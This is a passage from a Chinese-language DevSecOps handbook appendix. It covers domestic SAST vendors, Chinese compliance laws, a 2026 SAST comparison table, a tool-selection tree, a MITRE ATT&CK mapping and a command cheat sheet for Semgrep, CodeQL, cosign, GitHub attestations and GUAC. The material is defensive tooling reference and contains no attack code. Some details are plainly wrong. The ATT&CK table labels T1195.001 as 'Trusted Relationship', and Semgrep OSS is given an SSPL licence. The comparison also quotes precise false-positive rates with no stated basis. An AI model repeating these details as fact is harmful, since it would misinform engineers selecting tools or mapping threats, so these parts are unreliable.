### 中国 DevSecOps 市场洞察

| 工具/平台 | 类型 | 特点 |
|-----------|------|------|
| **奇安信代码安全卫士（CodeSecurity）** | SAST | 国产化 / 等保合规 / 支持国产中间件 |
| **腾讯云代码分析（TCA）** | SAST | 开源 / 多语言 / AI 辅助 |
| **阿里云代码审计 + 静态扫描** | SAST/DAST | 集成 EMAS / Codeup / Flow |
| **华为云 CodeArts Inspector** | SAST | 集成 DevCloud / 支持容器化部署 |
| **360 代码卫士** | SAST | 大模型辅助（基于自家 360智脑） |
| **梆梆安全源代码加固** | SAST+加固 | 移动应用为主 |
| **开源中国 OSCHINA Codereview** | SAST | 开源生态整合 |
| **爱奇艺 BSC（Bilingual Static Checker）** | SAST | 内部开源 |

### 中国合规驱动

- **《网络安全法》第 22 条**：网络产品应主动消除安全缺陷
- **《数据安全法》第 27 条**：建立健全全流程数据安全管理制度
- **《关键信息基础设施安全保护条例》**：等保 2.0 / 关基保护要求
- **《软件供应链安全实践指南》（TC260）**：2024-2025 国标推荐
- **GB/T 43698-2024《软件供应链安全要求》**：2024-10 实施

## C.10 综合工具生态矩阵 v2.0

### SAST 工具对比（2026 年）

| 维度 | Semgrep | CodeQL | SonarQube | Tencent TCA | 奇安信 CodeSec |
|------|---------|--------|-----------|-------------|----------------|
| **语言支持** | 30+（含 Gosu / Lua / R） | 10（C/C++/Java/Python/JS/Go/C#/Ruby/Swift/Kotlin） | 30+ | 25+ | 25+（含国产中间件） |
| **数据流分析** | interfile（Pro） / intrafile（OSS） | 全局 + interprocedural | 局部 / 数据流可选 | 全局 | 全局 |
| **AI 辅助** | Assistant / Autofix beta | Copilot Autofix GA | Sonar QG AI beta | 内部 AI 辅助 | 奇安信大模型 |
| **License** | OSS（SSPL）+ Pro | 商业（GHAS）/ CLI 免费（research） | LGPL + 商业 | Apache 2.0 | 商业 |
| **CI/CD 集成** | GitHub/GitLab/Jenkins 等 | GitHub 原生 + 任何 CI | 任何 CI | GitHub/GitLab/蓝盾 | 任何 CI |
| **误报率** | 中低（10-15%） | 低（5-10%） | 中（15-20%） | 中（10-15%） | 中（15-20%） |
| **学习曲线** | 低 | 高（QL 语言） | 低 | 低 | 低 |
| **中国合规** | ❌ | ❌ | 部分（本地化部署） | ✅ | ✅ |
| **2026 价格** | $74/user/mo（Pro） | $49/active committer/mo（GHAS） | $30k/yr（Team） | 开源 / 商业 | 按许可证 |

### 选择决策树 v2.0

```
需要 SAST 工具？
├─ 部署环境？
│  ├─ GitHub + 英语团队 → GHAS CodeQL + Semgrep OSS
│  ├─ GitHub + 中文团队 → GHAS CodeQL + Tencent TCA
│  ├─ GitLab + 私有部署 → Semgrep + SonarQube
│  └─ 中国合规要求 → Tencent TCA / 奇安信 CodeSec
├─ 数据流分析需求？
│  ├─ 简单（单文件） → Semgrep OSS
│  ├─ 复杂（跨文件污点） → CodeQL 或 Semgrep Pro
│  └─ 业务逻辑漏洞 → CodeQL 自定义 QL 查询
├─ AI 辅助需求？
│  ├─ 强（修复建议） → GHAS + Copilot Autofix
│  ├─ 中 → Semgrep Pro + Assistant
│  └─ 无 → 开源工具组合
└─ 合规需求？
   ├─ 等保 2.0 / 关基 → 国产化工具
   ├─ SOC2 / ISO27001 → 国外工具足够
   └─ GDPR → 任意 + 数据驻留
```

## C.11 MITRE ATT&CK v18/v19 扩展映射

| 战术 | 技术 ID | 技术名称 | 本手册新增覆盖 |
|------|---------|----------|----------------|
| Initial Access | T1195.002 | Compromise Software Supply Chain | @tanstack 事件 §C.4.2 / TeamPCP §C.4.1 |
| Initial Access | T1195.001 | Trusted Relationship | OpenVSX 投毒 §C.4.1 / CVE-2026-28353 |
| Execution | T1059.007 | JavaScript | npm 投毒 §C.4.2 / Action 命令注入 §C.2 |
| Defense Evasion | T1027.013 | Encrypted/Encoded File | SAST 绕过：base64/eval 模式 §2.1 |
| Defense Evasion | T1562.001 | Disable Tools | SAST 缺口侦察 §1.1 |
| Credential Access | T1552.001 | Credentials in Files | Push Protection / Gitleaks §C.1 |
| Credential Access | T1552.007 | Container API Keys | Syft / Grype Token 扫描 |
| Defense Evasion | T1036 | Masquerading | Action tag force-push §C.4.1 |
| Persistence | T1543.002 | Systemd Service | CI runner 后门 |
| Collection | T1560 | Archive Collected Data | 调试工件泄露 §C.4.3 |
| Exfiltration | T1567.002 | Exfil to Cloud Storage | Action secret 泄露 |

### OpenSSF PackSec（Package Security）映射

OpenSSF 2025-2026 推出 PackSec 框架，覆盖：

- **Build**：SLSA / in-toto / Sigstore
- **Distribute**：Provenance / Transparency Log (Rekor)
- **Consume**：GUAC / VEX / OSV-Scanner
- **Decommission**：Deprecation / Sunset

## C.12 关键工具命令速查 v2.0

### Semgrep

```bash
# 扫描并自动修复
semgrep ci --config auto --autofix

# 跨文件分析（Pro）
semgrep ci --config auto --pro --pro-intrafile

# 自定义规则测试
semgrep --test custom-rules/

# SARIF 上传到 GHAS
semgrep ci --sarif --output semgrep.sarif

# LSP 集成（IDE 实时反馈）
semgrep --lsp
```

### CodeQL

```bash
# 创建数据库
codeql database create my-db --language=python --source-root=.

# 跑查询
codeql database analyze my-db \
  codeql/python-queries --format=sarif-latest --output=out.sarif

# 增量分析（PR diff）
codeql database create my-db --source-root=. --language=python --overwrite
codeql database analyze my-db \
  --search-path=./custom-queries \
  --threads=0 \
  --format=sarif-latest \
  --output=out.sarif

# BQRS 文件查询
codeql bqrs decode my-db.bqrs --entities=string,url

# 包管理
codeql pack install ./codeql-pack.yaml
codeql pack publish
```

### Sigstore / Cosign（v3）

```bash
# Keyless 签名（默认）
cosign sign --yes ghcr.io/myorg/myapp:v1.0.0

# 验证
cosign verify ghcr.io/myorg/myapp:v1.0.0 \
  --certificate-identity=https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com

# SBoM Attestation
syft ghcr.io/myorg/myapp:v1.0.0 -o spdx-json > sbom.json
cosign attest --predicate sbom.json --type spdx \
  --yes ghcr.io/myorg/myapp:v1.0.0

# 验证 SBoM
cosign verify-attestation --type spdx \
  --certificate-identity=... \
  --certificate-oidc-issuer=... \
  ghcr.io/myorg/myapp:v1.0.0 | jq -r .payload | base64 -d | jq
```

### GitHub Artifact Attestations

```bash
# 验证制品（不需要 cosign / slsa-verifier）
gh attestation verify ./myapp \
  --repo myorg/myapp

# 验证镜像
gh attestation verify ghcr.io/myorg/myapp@sha256:... \
  --repo myorg/myapp

# 下载 attestation 离线检查
gh attestation download ./myapp \
  --repo myorg/myapp
```

### GUAC

```bash
# 摄取
guaccollect files ./sboms/ ./osv/

# 查询漏洞影响范围
guacone query vuln "CVE-2026-33634"

# 查询包依赖路径
guacone query path --from pkg:npm/left-pad --to pkg:docker/ghcr.io/myorg/app

# 查询缺失证明
guacone query missing-cert --cert-type slsa
```

---

## 来源

- GitHub CodeQL Action CHANGELOG：https://github.com/github/codeql-action/blob/main/CHANGELOG.md
- Semgrep Releases：https://github.com/semgrep/semgrep/releases
- GHSA Database：https://github.com/advisories
- NVD CVE 搜索：https://nvd.nist.gov/vuln/search
- OpenSSF：https://openssf.org/
- Sigstore：https://sigstore.dev/
- GitHub Engineering Blog：https://github.blog/
- OpenSSF Scorecard：https://github.com/ossf/scorecard
- GUAC：https://guac.sh/
- 奇安信攻防社区：https://forum.butian.net/
- 阿里云开发者社区：https://developer.aliyun.com/
- 腾讯云开发者社区：https://cloud.tencent.com/developer
- FreeBuf：https://www.freebuf.com/
- 先知社区：https://xz.aliyun.com/
